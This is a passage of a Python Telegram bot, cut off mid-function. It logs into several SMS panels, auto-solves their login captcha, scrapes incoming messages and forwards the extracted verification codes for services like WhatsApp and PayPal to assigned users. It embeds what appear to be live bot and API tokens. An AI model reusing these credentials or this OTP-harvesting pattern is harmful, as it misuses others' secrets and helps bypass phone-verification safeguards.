import time
import requests
import json
import re
import os
import subprocess
from datetime import datetime, date, timedelta
from urllib.parse import quote_plus
from pathlib import Path
import sqlite3
import telebot
import time
from telebot import types
import threading
import traceback
import random
import itertools
import logging
import socket
import platform
from collections import deque

# ======================
# 📋 إعداد السجلات (Logging)
# ======================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("bot.log", encoding="utf-8")
    ]
)
logger = logging.getLogger(__name__)

# ======================
# 🖥️ إعداد اللوحات (أربع لوحات)
# ======================

TRADITIONAL_DASHBOARD = {
    "name": "Fly Palen",
    "type": "traditional",
    "base": "http://193.70.33.154",
    "ajax_path": "/ints/agent/res/data_smscdr.php",
    "login_page": "/ints/login",
    "login_post": "/ints/signin",
    "username": "beposmspanel",
    "password": "",
    "session": requests.Session(),
    "is_logged_in": False,
    "timeout": 10,
    "idx_date": 0,
    "idx_number": 2,
    "idx_sms": 5,
}

API_DASHBOARD_1 = {
    "name": "Numper Panel",
    "type": "api",
    "api_url": "http://147.135.212.197/crapi/st/viewstats",
    "api_token": "SFBTR0ZBUzRWkE9Xd2GRVIeViIVBk3BpXnCTiElodkFhVWFYdYOLZA==",
    "session": requests.Session(),
    "is_logged_in": True,
    "idx_date": 3,
    "idx_number": 1,
    "idx_sms": 2,
}

API_DASHBOARD_2 = {
    "name": "D group",
    "type": "api_parameter",
    "api_url": "http://51.77.216.195/crapi/dgroup/viewstats",
    "api_token": "SFBTR0ZBUzRWkE9Xd2GRVIeViIVBk3BpXnCTiElodkFhVWFKESNN1661H",
    "session": requests.Session(),
    "is_logged_in": True,
    "data_keys": {"date": "dt", "number": "num", "sms": "message"},
}

API_DASHBOARD_3 = {
    "name": "Palen 4",
    "type": "traditional",
    "base": "http://145.239.130.45",
    "ajax_path": "/ints/agent/res/data_smscdr.php",
    "login_page": "/ints/login",
    "login_post": "/ints/signin",
    "username": "beposmspanel",
    "password": "",
    "session": requests.Session(),
    "is_logged_in": False,
    "timeout": 10,
    "idx_date": 0,
    "idx_number": 2,
    "idx_sms": 5,
}

# ======================
# 🔧 إعدادات عامة
# ======================
BOT_TOKEN = "8836939179:AAHh1HXF5R-Ws4P2N7yDIbS1F2oaQcuYMOM"
CHAT_IDS = ["1003898961615"]
REFRESH_INTERVAL = 5
TIMEOUT = 15
MAX_RETRIES = 3
RETRY_DELAY = 3
DB_PATH = "bot.db"
ADMIN_IDS = [7432229551]
BOT_ACTIVE = True

IDX_DATE   = 0
IDX_NUMBER = 2
IDX_SMS    = 5

# حجم ذاكرة المفاتيح المرسلة — deque تحذف الأقدم تلقائياً
SENT_KEYS_MAX = 5000

if not BOT_TOKEN:
    raise SystemExit("❌ BOT_TOKEN غير موجود!")
if not CHAT_IDS:
    raise SystemExit("❌ CHAT_IDS غير مكوّن!")

# ======================
# 🌍 رموز الدول
# ======================
COUNTRY_CODES = {
    "1": ("USA/Canada", "🇺🇸", "US"),
    "7": ("Russia", "🇷🇺", "RU"),
    "20": ("Egypt", "🇪🇬", "EG"),
    "27": ("South Africa", "🇿🇦", "ZA"),
    "30": ("Greece", "🇬🇷", "GR"),
    "31": ("Netherlands", "🇳🇱", "NL"),
    "32": ("Belgium", "🇧🇪", "BE"),
    "33": ("France", "🇫🇷", "FR"),
    "34": ("Spain", "🇪🇸", "ES"),
    "36": ("Hungary", "🇭🇺", "HU"),
    "39": ("Italy", "🇮🇹", "IT"),
    "40": ("Romania", "🇷🇴", "RO"),
    "41": ("Switzerland", "🇨🇭", "CH"),
    "43": ("Austria", "🇦🇹", "AT"),
    "44": ("United Kingdom", "🇬🇧", "UK"),
    "45": ("Denmark", "🇩🇰", "DK"),
    "46": ("Sweden", "🇸🇪", "SE"),
    "47": ("Norway", "🇳🇴", "NO"),
    "48": ("Poland", "🇵🇱", "PL"),
    "49": ("Germany", "🇩🇪", "DE"),
    "51": ("Peru", "🇵🇪", "PE"),
    "52": ("Mexico", "🇲🇽", "MX"),
    "53": ("Cuba", "🇨🇺", "CU"),
    "54": ("Argentina", "🇦🇷", "AR"),
    "55": ("Brazil", "🇧🇷", "BR"),
    "56": ("Chile", "🇨🇱", "CL"),
    "57": ("Colombia", "🇨🇴", "CO"),
    "58": ("Venezuela", "🇻🇪", "VE"),
    "60": ("Malaysia", "🇲🇾", "MY"),
    "61": ("Australia", "🇦🇺", "AU"),
    "62": ("Indonesia", "🇮🇩", "ID"),
    "63": ("Philippines", "🇵🇭", "PH"),
    "64": ("New Zealand", "🇳🇿", "NZ"),
    "65": ("Singapore", "🇸🇬", "SG"),
    "66": ("Thailand", "🇹🇭", "TH"),
    "81": ("Japan", "🇯🇵", "JP"),
    "82": ("South Korea", "🇰🇷", "KR"),
    "84": ("Vietnam", "🇻🇳", "VN"),
    "86": ("China", "🇨🇳", "CN"),
    "90": ("Turkey", "🇹🇷", "TR"),
    "91": ("India", "🇮🇳", "IN"),
    "92": ("Pakistan", "🇵🇰", "PK"),
    "93": ("Afghanistan", "🇦🇫", "AF"),
    "94": ("Sri Lanka", "🇱🇰", "LK"),
    "95": ("Myanmar", "🇲🇲", "MM"),
    "98": ("Iran", "🇮🇷", "IR"),
    "211": ("South Sudan", "🇸🇸", "SS"),
    "212": ("Morocco", "🇲🇦", "MA"),
    "213": ("Algeria", "🇩🇿", "DZ"),
    "216": ("Tunisia", "🇹🇳", "TN"),
    "218": ("Libya", "🇱🇾", "LY"),
    "220": ("Gambia", "🇬🇲", "GM"),
    "221": ("Senegal", "🇸🇳", "SN"),
    "222": ("Mauritania", "🇲🇷", "MR"),
    "223": ("Mali", "🇲🇱", "ML"),
    "224": ("Guinea", "🇬🇳", "GN"),
    "225": ("Ivory Coast", "🇨🇮", "CI"),
    "226": ("Burkina Faso", "🇧🇫", "BF"),
    "227": ("Niger", "🇳🇪", "NE"),
    "228": ("Togo", "🇹🇬", "TG"),
    "229": ("Benin", "🇧🇯", "BJ"),
    "230": ("Mauritius", "🇲🇺", "MU"),
    "231": ("Liberia", "🇱🇷", "LR"),
    "232": ("Sierra Leone", "🇸🇱", "SL"),
    "233": ("Ghana", "🇬🇭", "GH"),
    "234": ("Nigeria", "🇳🇬", "NG"),
    "235": ("Chad", "🇹🇩", "TD"),
    "236": ("Central African Rep", "🇨🇫", "CF"),
    "237": ("Cameroon", "🇨🇲", "CM"),
    "238": ("Cape Verde", "🇨🇻", "CV"),
    "239": ("Sao Tome", "🇸🇹", "ST"),
    "240": ("Equatorial Guinea", "🇬🇶", "GQ"),
    "241": ("Gabon", "🇬🇦", "GA"),
    "242": ("Congo", "🇨🇬", "CG"),
    "243": ("DR Congo", "🇨🇩", "CD"),
    "244": ("Angola", "🇦🇴", "AO"),
    "245": ("Guinea-Bissau", "🇬🇼", "GW"),
    "248": ("Seychelles", "🇸🇨", "SC"),
    "249": ("Sudan", "🇸🇩", "SD"),
    "250": ("Rwanda", "🇷🇼", "RW"),
    "251": ("Ethiopia", "🇪🇹", "ET"),
    "252": ("Somalia", "🇸🇴", "SO"),
    "253": ("Djibouti", "🇩🇯", "DJ"),
    "254": ("Kenya", "🇰🇪", "KE"),
    "255": ("Tanzania", "🇹🇿", "TZ"),
    "256": ("Uganda", "🇺🇬", "UG"),
    "257": ("Burundi", "🇧🇮", "BI"),
    "258": ("Mozambique", "🇲🇿", "MZ"),
    "260": ("Zambia", "🇿🇲", "ZM"),
    "261": ("Madagascar", "🇲🇬", "MG"),
    "262": ("Reunion", "🇷🇪", "RE"),
    "263": ("Zimbabwe", "🇿🇼", "ZW"),
    "264": ("Namibia", "🇳🇦", "NA"),
    "265": ("Malawi", "🇲🇼", "MW"),
    "266": ("Lesotho", "🇱🇸", "LS"),
    "267": ("Botswana", "🇧🇼", "BW"),
    "268": ("Eswatini", "🇸🇿", "SZ"),
    "269": ("Comoros", "🇰🇲", "KM"),
    "350": ("Gibraltar", "🇬🇮", "GI"),
    "351": ("Portugal", "🇵🇹", "PT"),
    "352": ("Luxembourg", "🇱🇺", "LU"),
    "353": ("Ireland", "🇮🇪", "IE"),
    "354": ("Iceland", "🇮🇸", "IS"),
    "355": ("Albania", "🇦🇱", "AL"),
    "356": ("Malta", "🇲🇹", "MT"),
    "357": ("Cyprus", "🇨🇾", "CY"),
    "358": ("Finland", "🇫🇮", "FI"),
    "359": ("Bulgaria", "🇧🇬", "BG"),
    "370": ("Lithuania", "🇱🇹", "LT"),
    "371": ("Latvia", "🇱🇻", "LV"),
    "372": ("Estonia", "🇪🇪", "EE"),
    "373": ("Moldova", "🇲🇩", "MD"),
    "374": ("Armenia", "🇦🇲", "AM"),
    "375": ("Belarus", "🇧🇾", "BY"),
    "376": ("Andorra", "🇦🇩", "AD"),
    "377": ("Monaco", "🇲🇨", "MC"),
    "378": ("San Marino", "🇸🇲", "SM"),
    "380": ("Ukraine", "🇺🇦", "UA"),
    "381": ("Serbia", "🇷🇸", "RS"),
    "382": ("Montenegro", "🇲🇪", "ME"),
    "383": ("Kosovo", "🇽🇰", "XK"),
    "385": ("Croatia", "🇭🇷", "HR"),
    "386": ("Slovenia", "🇸🇮", "SI"),
    "387": ("Bosnia", "🇧🇦", "BA"),
    "389": ("North Macedonia", "🇲🇰", "MK"),
    "420": ("Czech Republic", "🇨🇿", "CZ"),
    "421": ("Slovakia", "🇸🇰", "SK"),
    "423": ("Liechtenstein", "🇱🇮", "LI"),
    "500": ("Falkland Islands", "🇫🇰", "FK"),
    "501": ("Belize", "🇧🇿", "BZ"),
    "502": ("Guatemala", "🇬🇹", "GT"),
    "503": ("El Salvador", "🇸🇻", "SV"),
    "504": ("Honduras", "🇭🇳", "HN"),
    "505": ("Nicaragua", "🇳🇮", "NI"),
    "506": ("Costa Rica", "🇨🇷", "CR"),
    "507": ("Panama", "🇵🇦", "PA"),
    "509": ("Haiti", "🇭🇹", "HT"),
    "591": ("Bolivia", "🇧🇴", "BO"),
    "592": ("Guyana", "🇬🇾", "GY"),
    "593": ("Ecuador", "🇪🇨", "EC"),
    "595": ("Paraguay", "🇵🇾", "PY"),
    "597": ("Suriname", "🇸🇷", "SR"),
    "598": ("Uruguay", "🇺🇾", "UY"),
    "670": ("Timor-Leste", "🇹🇱", "TL"),
    "673": ("Brunei", "🇧🇳", "BN"),
    "674": ("Nauru", "🇳🇷", "NR"),
    "675": ("Papua New Guinea", "🇵🇬", "PG"),
    "676": ("Tonga", "🇹🇴", "TO"),
    "677": ("Solomon Islands", "🇸🇧", "SB"),
    "678": ("Vanuatu", "🇻🇺", "VU"),
    "679": ("Fiji", "🇫🇯", "FJ"),
    "680": ("Palau", "🇵🇼", "PW"),
    "685": ("Samoa", "🇼🇸", "WS"),
    "686": ("Kiribati", "🇰🇮", "KI"),
    "687": ("New Caledonia", "🇳🇨", "NC"),
    "688": ("Tuvalu", "🇹🇻", "TV"),
    "689": ("French Polynesia", "🇵🇫", "PF"),
    "691": ("Micronesia", "🇫🇲", "FM"),
    "692": ("Marshall Islands", "🇲🇭", "MH"),
    "850": ("North Korea", "🇰🇵", "KP"),
    "852": ("Hong Kong", "🇭🇰", "HK"),
    "853": ("Macau", "🇲🇴", "MO"),
    "855": ("Cambodia", "🇰🇭", "KH"),
    "856": ("Laos", "🇱🇦", "LA"),
    "960": ("Maldives", "🇲🇻", "MV"),
    "961": ("Lebanon", "🇱🇧", "LB"),
    "962": ("Jordan", "🇯🇴", "JO"),
    "963": ("Syria", "🇸🇾", "SY"),
    "964": ("Iraq", "🇮🇶", "IQ"),
    "965": ("Kuwait", "🇰🇼", "KW"),
    "966": ("Saudi Arabia", "🇸🇦", "SA"),
    "967": ("Yemen", "🇾🇪", "YE"),
    "968": ("Oman", "🇴🇲", "OM"),
    "970": ("Palestine", "🇵🇸", "PS"),
    "971": ("UAE", "🇦🇪", "AE"),
    "972": ("Israel", "🇮🇱", "IL"),
    "973": ("Bahrain", "🇧🇭", "BH"),
    "974": ("Qatar", "🇶🇦", "QA"),
    "975": ("Bhutan", "🇧🇹", "BT"),
    "976": ("Mongolia", "🇲🇳", "MN"),
    "977": ("Nepal", "🇳🇵", "NP"),
    "992": ("Tajikistan", "🇹🇯", "TJ"),
    "993": ("Turkmenistan", "🇹🇲", "TM"),
    "994": ("Azerbaijan", "🇦🇿", "AZ"),
    "995": ("Georgia", "🇬🇪", "GE"),
    "996": ("Kyrgyzstan", "🇰🇬", "KG"),
    "998": ("Uzbekistan", "🇺🇿", "UZ"),
}

# ======================
# 🗄️ قاعدة البيانات
# ======================
def get_db_conn():
    return sqlite3.connect(DB_PATH, timeout=30.0, check_same_thread=False)

def init_db():
    conn = get_db_conn()
    c = conn.cursor()
    c.executescript('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            country_code TEXT,
            assigned_number TEXT,
            is_banned INTEGER DEFAULT 0,
            private_combo_country TEXT DEFAULT NULL
        );
        CREATE TABLE IF NOT EXISTS combos (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            country_code TEXT,
            combo_index INTEGER DEFAULT 1,
            numbers TEXT,
            UNIQUE(country_code, combo_index)
        );
        CREATE TABLE IF NOT EXISTS otp_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            number TEXT,
            otp TEXT,
            full_message TEXT,
            timestamp TEXT,
            assigned_to INTEGER,
            dashboard_name TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS bot_settings (
            key TEXT PRIMARY KEY,
            value TEXT
        );
        CREATE TABLE IF NOT EXISTS private_combos (
            user_id INTEGER,
            country_code TEXT,
            numbers TEXT,
            PRIMARY KEY (user_id, country_code)
        );
        CREATE TABLE IF NOT EXISTS force_sub_channels (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            channel_url TEXT UNIQUE NOT NULL,
            description TEXT DEFAULT '',
            enabled INTEGER DEFAULT 1
        );
    ''')
    c.execute("INSERT OR IGNORE INTO bot_settings (key, value) VALUES ('force_sub_enabled', '0')")
    c.execute("INSERT OR IGNORE INTO bot_settings (key, value) VALUES ('force_sub_channel', '')")
    conn.commit()
    conn.close()

init_db()

def get_setting(key):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT value FROM bot_settings WHERE key=?", (key,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def set_setting(key, value):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("REPLACE INTO bot_settings (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

def get_user(user_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row

def save_user(user_id, username="", first_name="", last_name="",
              country_code=None, assigned_number=None, private_combo_country=None):
    existing = get_user(user_id)
    if existing:
        country_code          = country_code          if country_code          is not None else existing[4]
        assigned_number       = assigned_number       if assigned_number       is not None else existing[5]
        private_combo_country = private_combo_country if private_combo_country is not None else existing[7]
        username   = username   or existing[1] or ""
        first_name = first_name or existing[2] or ""
        last_name  = last_name  or existing[3] or ""
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("""
        REPLACE INTO users
            (user_id, username, first_name, last_name,
             country_code, assigned_number, is_banned, private_combo_country)
        VALUES (?, ?, ?, ?, ?, ?,
            COALESCE((SELECT is_banned FROM users WHERE user_id=?), 0),
            ?)
    """, (user_id, username, first_name, last_name,
          country_code, assigned_number, user_id, private_combo_country))
    conn.commit()
    conn.close()

def ban_user(user_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned=1 WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()

def unban_user(user_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned=0 WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()

def is_banned(user_id):
    user = get_user(user_id)
    return bool(user and user[6] == 1)

def get_all_users():
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE is_banned=0")
    users = [row[0] for row in c.fetchall()]
    conn.close()
    return users

def get_user_info(user_id):
    return get_user(user_id)

def get_combo(country_code, combo_index=1, user_id=None):
    conn = get_db_conn()
    c = conn.cursor()
    if user_id:
        c.execute("SELECT numbers FROM private_combos WHERE user_id=? AND country_code=?", (user_id, country_code))
        row = c.fetchone()
        if row:
            conn.close()
            return json.loads(row[0])
    c.execute("SELECT numbers FROM combos WHERE country_code=? AND combo_index=?", (country_code, combo_index))
    row = c.fetchone()
    conn.close()
    return json.loads(row[0]) if row else []

def save_combo(country_code, numbers, user_id=None):
    conn = get_db_conn()
    c = conn.cursor()
    if user_id:
        c.execute("REPLACE INTO private_combos (user_id, country_code, numbers) VALUES (?, ?, ?)",
                  (user_id, country_code, json.dumps(numbers)))
    else:
        c.execute("SELECT MAX(combo_index) FROM combos WHERE country_code=?", (country_code,))
        max_idx = c.fetchone()[0]
        next_idx = 1 if max_idx is None else max_idx + 1
        c.execute("INSERT INTO combos (country_code, combo_index, numbers) VALUES (?, ?, ?)",
                  (country_code, next_idx, json.dumps(numbers)))
    conn.commit()
    conn.close()

def delete_combo(country_code, combo_index=None, user_id=None):
    try:
        conn = get_db_conn()
        c = conn.cursor()
        if user_id:
            c.execute("DELETE FROM private_combos WHERE user_id=? AND country_code=?", (user_id, country_code))
        elif combo_index:
            c.execute("DELETE FROM combos WHERE country_code=? AND combo_index=?", (country_code, combo_index))
        else:
            c.execute("DELETE FROM combos WHERE country_code=?", (country_code,))
        conn.commit()
        conn.close()
        return True
    except sqlite3.Error as e:
        logger.error(f"خطأ في delete_combo: {e}")
        return False

def get_all_combos():
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT country_code, combo_index FROM combos ORDER BY country_code, combo_index")
    combos = c.fetchall()
    conn.close()
    return combos

def assign_number_to_user(user_id, number):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("UPDATE users SET assigned_number=? WHERE user_id=?", (number, user_id))
    conn.commit()
    conn.close()

def get_user_by_number(number):
    if not number:
        return None
    clean_num = re.sub(r'\D', '', str(number))
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT user_id, assigned_number FROM users WHERE assigned_number IS NOT NULL AND assigned_number != ''")
    rows = c.fetchall()
    conn.close()
    for user_id, assigned in rows:
        clean_assigned = re.sub(r'\D', '', str(assigned))
        if clean_num == clean_assigned:
            return user_id
        if clean_num.endswith(clean_assigned[-9:]):
            return user_id
        if clean_assigned.endswith(clean_num[-9:]):
            return user_id
    return None

def release_number(old_number):
    if not old_number:
        return
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("UPDATE users SET assigned_number=NULL WHERE assigned_number=?", (old_number,))
    conn.commit()
    conn.close()

def log_otp(number, otp, full_message, assigned_to=None, dashboard_name=""):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("""
        INSERT INTO otp_logs (number, otp, full_message, timestamp, assigned_to, dashboard_name)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (number, otp, full_message,
          datetime.now().strftime("%Y-%m-%d %H:%M:%S"), assigned_to, dashboard_name))
    conn.commit()
    conn.close()

def get_otp_logs():
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT * FROM otp_logs")
    logs = c.fetchall()
    conn.close()
    return logs

def get_available_numbers(country_code, combo_index=1, user_id=None):
    all_numbers = get_combo(country_code, combo_index, user_id)
    if not all_numbers:
        return []
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT assigned_number FROM users WHERE assigned_number IS NOT NULL AND assigned_number != ''")
    used = set(row[0] for row in c.fetchall())
    conn.close()
    return [n for n in all_numbers if n not in used]

def get_all_force_sub_channels(enabled_only=True):
    conn = get_db_conn()
    c = conn.cursor()
    if enabled_only:
        c.execute("SELECT id, channel_url, description FROM force_sub_channels WHERE enabled=1 ORDER BY id")
    else:
        c.execute("SELECT id, channel_url, description FROM force_sub_channels ORDER BY id")
    rows = c.fetchall()
    conn.close()
    return rows

def add_force_sub_channel(channel_url, description=""):
    conn = get_db_conn()
    c = conn.cursor()
    try:
        c.execute("INSERT INTO force_sub_channels (channel_url, description, enabled) VALUES (?, ?, 1)",
                  (channel_url.strip(), description.strip()))
        conn.commit()
        return True
    except sqlite3.IntegrityError:
        return False
    finally:
        conn.close()

def delete_force_sub_channel(channel_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("DELETE FROM force_sub_channels WHERE id=?", (channel_id,))
    changed = c.rowcount > 0
    conn.commit()
    conn.close()
    return changed

def toggle_force_sub_channel(channel_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("UPDATE force_sub_channels SET enabled = 1-enabled WHERE id=?", (channel_id,))
    conn.commit()
    conn.close()

def is_maintenance_mode():
    return not BOT_ACTIVE

def set_maintenance_mode(status):
    global BOT_ACTIVE
    BOT_ACTIVE = not status

# ======================
# 🤖 إنشاء البوت
# ======================
bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=8)

# ======================
# 🔐 الاشتراك الإجباري
# ======================
def force_sub_check(user_id):
    channels = get_all_force_sub_channels(enabled_only=True)
    if not channels:
        return True
    for _, url, _ in channels:
        try:
            ch = "@" + url.split("/")[-1] if url.startswith("https://t.me/") else url
            member = bot.get_chat_member(ch, user_id)
            if member.status not in ("member", "administrator", "creator"):
                return False
        except Exception as e:
            logger.warning(f"خطأ التحقق من القناة {url}: {e}")
            return False
    return True

def force_sub_markup():
    channels = get_all_force_sub_channels(enabled_only=True)
    if not channels:
        return None
    markup = types.InlineKeyboardMarkup()
    for _, url, desc in channels:
        text = f"📢 {desc}" if desc else "📢 اشترك في القناة"
        markup.add(types.InlineKeyboardButton(text, url=url))
    markup.add(types.InlineKeyboardButton("✅ تحقق من الاشتراك", callback_data="check_sub"))
    return markup

# ======================
# 🛠️ دوال مساعدة
# ======================
def safe_html(text):
    if not text:
        return ""
    return (str(text)
            .replace('&', '&amp;')
            .replace('<', '&lt;')
            .replace('>', '&gt;')
            .replace('"', '&quot;'))

def clean_html(text):
    if not text:
        return ""
    return re.sub(r'<[^>]+>', '', str(text)).strip()

def clean_number(number):
    if not number:
        return ""
    return re.sub(r'\D', '', str(number))

def is_admin(user_id):
    return user_id in ADMIN_IDS

def get_country_info(number):
    number = re.sub(r'\D', '', str(number)).lstrip('0')
    for code in sorted(COUNTRY_CODES.keys(), key=len, reverse=True):
        if number.startswith(code):
            return COUNTRY_CODES[code]
    return ("Unknown", "🌍", "UN")

def mask_number(number):
    number = str(number).strip()
    if len(number) > 8:
        return number[:4] + "••••" + number[-3:]
    return number

def extract_otp(message):
    if not message:
        return "N/A"
    text = str(message)
    explicit_patterns = [
        r'(?:verification\s+code|code|رمز|كود|otp|pin|passcode|شفرة)[:\s\-]*[‎\u200f]?(\d{4,8})',
        r'(?:is|هو|يهو)[:\s]+[‎\u200f]?(\d{4,8})',
        r'(\d{3})[‐\-\s](\d{3})',
        r'(\d{4})[‐\-\s](\d{4})',
    ]
    for pat in explicit_patterns:
        m = re.search(pat, text, re.IGNORECASE)
        if m:
            groups = [g for g in m.groups() if g]
            return ''.join(groups)
    candidates = re.findall(r'\b(\d{4,8})\b', text)
    for c in candidates:
        if not re.match(r'^(19|20)\d{2}$', c):
            return c
    return "N/A"

def detect_service(message):
    if not message:
        return "Unknown"
    message_lower = message.lower()
    services = {
        "#WP":  ["whatsapp", "واتساب", "واتس", "wts"],
        "#FB":  ["facebook", "فيسبوك", "fb"],
        "#IG":  ["instagram", "انستقرام", "انستا", "insta"],
        "#TG":  ["telegram", "تيليجرام", "تلي", "tg"],
        "#TW":  ["twitter", "تويتر", " x.com", "x "],
        "#GG":  ["google", "gmail", "جوجل"],
        "#DC":  ["discord", "ديسكورد"],
        "#LN":  ["line", "لاين"],
        "#VB":  ["viber", "فايبر"],
        "#SK":  ["skype", "سكايب"],
        "#SC":  ["snapchat", "سناب"],
        "#TT":  ["tiktok", "تيك توك", "tik tok"],
        "#AMZ": ["amazon", "امازون"],
        "#APL": ["apple", "ابل", "icloud"],
        "#MS":  ["microsoft", "مايكروسوفت"],
        "#IN":  ["linkedin", "لينكد"],
        "#UB":  ["uber", "اوبر"],
        "#AB":  ["airbnb", "ايربنب"],
        "#NF":  ["netflix", "نتفلكس"],
        "#SP":  ["spotify", "سبوتيفاي"],
        "#YT":  ["youtube", "يوتيوب"],
        "#GH":  ["github", "جيت هاب"],
        "#PT":  ["pinterest", "بنتريست"],
        "#PP":  ["paypal", "باي بال"],
        "#BK":  ["booking", "بوكينج"],
        "#STC": ["stcpay", "stc pay"],
        "#OLX": ["olx", "اوليكس"],
    }
    for code, keywords in services.items():
        for kw in keywords:
            if kw in message_lower:
                return code
    return "Unknown"

def format_message(date_str, number, sms):
    country_name, country_flag, _ = get_country_info(number)
    masked_num = mask_number(number)
    otp_code   = extract_otp(sms)
    service    = detect_service(sms)
    return (
        f"╭───────────────╮\n"
        f"│  ▂ ▄ ▅ ▆ 𝐎𝐓𝐏 ▆ ▅ ▄ ▂  │\n"
        f"│───────────────│\n"
        f"│◈𝐂𝐎𝐔𝐍𝐓𝐑𝐘: {country_name}\n"
        f"│◈𝐅𝐋𝐀𝐆:    {country_flag}\n"
        f"│◈𝐒𝐄𝐑𝐕𝐈𝐂𝐄: {service}\n"
        f"│◈𝐍𝐔𝐌𝐁𝐄𝐑: {masked_num}\n"
        f"│◈𝐓𝐈𝐌𝐄:   {date_str}\n"
        f"╰───────────────\n"
        f"│🎯 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃 ✅\n"
        f"│◈🔐𝐂𝐎𝐃𝐄: <code>{safe_html(otp_code)}</code>\n"
        f"╰───────────────╯"
    )

# ======================
# 📡 دوال الاتصال باللوحات
# ======================
COMMON_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8",
}

for dash in [TRADITIONAL_DASHBOARD, API_DASHBOARD_1, API_DASHBOARD_2, API_DASHBOARD_3]:
    dash["session"].headers.update(COMMON_HEADERS)
    if dash.get("base"):
        dash["login_page_url"] = dash["base"] + dash.get("login_page", "")
        dash["login_post_url"] = dash["base"] + dash.get("login_post", "")
        dash["ajax_url"]       = dash["base"] + dash.get("ajax_path", "")

def retry_request(func, max_retries=MAX_RETRIES, retry_delay=RETRY_DELAY):
    last_exc = None
    for attempt in range(max_retries):
        try:
            return func()
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
            last_exc = e
            if attempt < max_retries - 1:
                logger.warning(f"محاولة {attempt+1}/{max_retries} فشلت: {type(e).__name__} — انتظار {retry_delay}s")
                time.sleep(retry_delay)
    raise last_exc

def build_ajax_url(dash, wide_range=False):
    if wide_range:
        start_date = date.today() - timedelta(days=30)
    else:
        start_date = date.today()
    end_date = date.today() + timedelta(days=1)
    fdate1 = f"{start_date.strftime('%Y-%m-%d')} 00:00:00"
    fdate2 = f"{end_date.strftime('%Y-%m-%d')} 23:59:59"
    q = (
        f"fdate1={quote_plus(fdate1)}&fdate2={quote_plus(fdate2)}"
        f"&frange=&fclient=&fnum=&fcli=&fgdate=&fgmonth=&fgrange=&fgclient=&fgnumber=&fgcli="
        f"&fg=0&sEcho=1&iColumns=9&sColumns=%2C%2C%2C%2C%2C%2C%2C%2C"
        f"&iDisplayStart=0&iDisplayLength=5000"
        f"&mDataProp_0=0&mDataProp_1=1&mDataProp_2=2&mDataProp_3=3&mDataProp_4=4"
        f"&mDataProp_5=5&mDataProp_6=6&mDataProp_7=7&mDataProp_8=8"
        f"&sSearch=&bRegex=false&iSortCol_0=0&sSortDir_0=desc&iSortingCols=1"
        f"&_={int(time.time()*1000)}"
    )
    return dash["ajax_url"] + "?" + q

def login_dashboard(dash):
    logger.info(f"[{dash['name']}] محاولة تسجيل الدخول...")
    try:
        resp = dash["session"].get(dash["login_page_url"], timeout=dash.get("timeout", 10))
        if "logout" in resp.text.lower():
            logger.info(f"[{dash['name']}] ✅ جلسة نشطة بالفعل")
            return True
        match = re.search(r'What is (\d+) \+ (\d+)', resp.text)
        if not match:
            logger.warning(f"[{dash['name']}] ❌ لم يُعثر على Captcha")
            return False
        n1, n2 = int(match.group(1)), int(match.group(2))
        captcha = n1 + n2
        logger.info(f"[{dash['name']}] Captcha: {n1}+{n2}={captcha}")
        resp = dash["session"].post(
            dash["login_post_url"],
            data={"username": dash["username"], "password": dash["password"], "capt": str(captcha)},
            timeout=dash.get("timeout", 10)
        )
        if any(kw in resp.text.lower() for kw in ("dashboard", "logout", "agent")):
            logger.info(f"[{dash['name']}] ✅ تسجيل دخول ناجح")
            return True
        logger.warning(f"[{dash['name']}] ❌ فشل تسجيل الدخول")
        return False
    except Exception as e:
        logger.error(f"[{dash['name']}] ❌ خطأ شبكي: {e}")
        return False

def fetch_traditional(dash):
    try:
        if not dash.get("is_logged_in"):
            if not login_dashboard(dash):
                return None
            dash["is_logged_in"] = True
        url = build_ajax_url(dash)
        def do_fetch():
            r = dash["session"].get(url, timeout=TIMEOUT)
            if r.status_code == 403 or ("login" in r.text.lower() and "login" in r.url.lower()):
                raise Exception("session_expired")
            r.raise_for_status()
            return r.json()
        return retry_request(do_fetch, max_retries=2, retry_delay=2)
    except Exception as e:
        if "session_expired" in str(e):
            logger.info(f"[{dash['name']}] الجلسة منتهية، تجديد...")
            dash["is_logged_in"] = False
            if login_dashboard(dash):
                dash["is_logged_in"] = True
                try:
                    return dash["session"].get(build_ajax_url(dash), timeout=TIMEOUT).json()
                except:
                    pass
        else:
